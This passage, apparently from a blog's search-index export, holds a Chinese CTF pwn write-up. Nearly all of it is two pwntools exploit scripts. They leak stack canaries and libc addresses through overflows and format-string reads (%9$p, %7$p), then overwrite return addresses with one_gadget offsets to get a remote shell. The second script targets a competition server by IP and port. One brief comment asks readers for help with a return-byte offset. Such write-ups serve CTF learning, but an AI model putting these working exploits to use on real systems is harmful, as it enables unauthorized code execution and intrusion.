class="line">#0x0000000000000a62</span><br><span class="line">payload2&#x3D;&#39;a&#39;*0x28+p64(canary)+&#39;a&#39;*0x18+&#39;\x04&#39;</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x28+&#39;a&#39;*0x8+&#39;a&#39;*0x18</span><br><span class="line">sh.send(payload3)</span><br><span class="line">sh.recvuntil(&#39;a&#39;*0x48)</span><br><span class="line">libc_main_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-240</span><br><span class="line">print (&#39;libc_main_addr:&#39; +hex(libc_main_addr))</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;__libc_start_main&#39;,libc_main_addr)</span><br><span class="line">libc_base&#x3D;libc_main_addr-libc.dump(&#39;__libc_start_main&#39;)</span><br><span class="line">#0x45216</span><br><span class="line">one_gedget&#x3D;libc_base+0x45216</span><br><span class="line">payload4&#x3D;&#39;a&#39;*0x28+p64(canary)+&#39;a&#39;*0x18+p64(one_gedget)</span><br><span class="line">sh.send(payload4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="PWN-tang"><a href="#PWN-tang" class="headerlink" title="PWN_tang"></a>PWN_tang</h3><p>和上一道题利用思路一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#coding &#x3D;&#39;utf-8&#39;</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28006)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn6&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn6&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;%9$p&#39;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(&#39;\x0a&#39;)</span><br><span class="line">canary&#x3D;int(sh.recv(18),16)</span><br><span class="line">print(&#39;canary:&#39; +hex(canary))</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;a&#39;</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x38+p64(canary)+&#39;a&#39;*0x18+&#39;\x08&#39;  </span><br><span class="line">这里覆盖返回地址最后一个字节的时候有错误，调试了半天也没弄明白，本来应该是\x10的，但是我发现\x08可以重新执行程序，\x10就不可以.哪位大佬如果知道可以指点一下。</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.send(payload3)</span><br><span class="line"></span><br><span class="line">payload4&#x3D;&#39;%7$p&#39;</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&#39;\x9f\x0a&#39;)</span><br><span class="line">sh.send(payload4)</span><br><span class="line">setvbuf_addr&#x3D;int(sh.recv(14),16)-324</span><br><span class="line">print(&#39;setvbuf:&#39; +hex(setvbuf_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;setvbuf&#39;,setvbuf_addr)</span><br><span class="line">libc_base&#x3D;setvbuf_addr-libc.dump(&#39;setvbuf&#39;)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">#0xf1147</span><br><span class="line">one_gadget&#x3D;libc_base+0xf1147</span><br><span class="line">payload5&#x3D;&#39;a&#39;*0x38+p64(canary)+&#39;a&#39;*0x18+p64(one_gadget)</span><br><span class="line">sh.send(payload5)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>CTF Game</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CTF Game</tag>
      </tags>
  </entry>
</search>
